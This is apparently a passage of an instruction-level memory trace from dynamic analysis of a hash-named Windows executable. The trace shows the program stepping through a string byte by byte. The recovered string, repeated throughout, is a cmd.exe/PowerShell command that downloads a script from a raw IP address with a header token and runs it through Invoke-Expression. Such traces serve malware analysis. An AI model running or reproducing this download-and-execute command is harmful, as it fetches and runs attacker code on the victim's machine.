+        [0x00007ff745e2a8ab] = 0x2d (45) -> "-Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8ac] = 0x43 (67) -> "Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8ad] = 0x6f (111) -> "ommand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8ae] = 0x6d (109) -> "mmand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8af] = 0x6d (109) -> "mand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b0] = 0x61 (97) -> "and "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b1] = 0x6e (110) -> "nd "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b2] = 0x64 (100) -> "d "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b3] = 0x20 (32) -> " "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b4] = 0x22 (34) -> ""iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b5] = 0x69 (105) -> "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b6] = 0x77 (119) -> "wr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b7] = 0x72 (114) -> "r -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b8] = 0x20 (32) -> " -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8b9] = 0x2d (45) -> "-useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8ba] = 0x75 (117) -> "useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8bb] = 0x73 (115) -> "seb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8bc] = 0x65 (101) -> "eb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8bd] = 0x62 (98) -> "b 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8be] = 0x20 (32) -> " 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8bf] = 0x27 (39) -> "'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8c0] = 0x68 (104) -> "http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8c1] = 0x74 (116) -> "ttp://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e17f23 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000006c73 | push r14 | [Write]: 
+        [0x0000009c9c3af860] = 0x000001fa6e270750 (2175101503312)
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e17f5e a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000006cae | cmp byte ptr [rcx], r14b | [Read 1Op]: 
+        [0x000001fa6e270750] = 0x43 (67) -> "C:\Windows\system32\cmd.exe /c powershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e17fbc a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000006d0c | mov dword ptr [rsp+0x28], r14d | [Write]: 
+        [0x0000009c9c3af858] = 0x00000000 (0) -> ""
+-------------------------------------------------------------------------------------------------------------------------------------
+        [0x000001fa6e2770c0] = 0x0000000000000000 (0) -> ""
+--------------------------------------------------------------------------------------------------------------
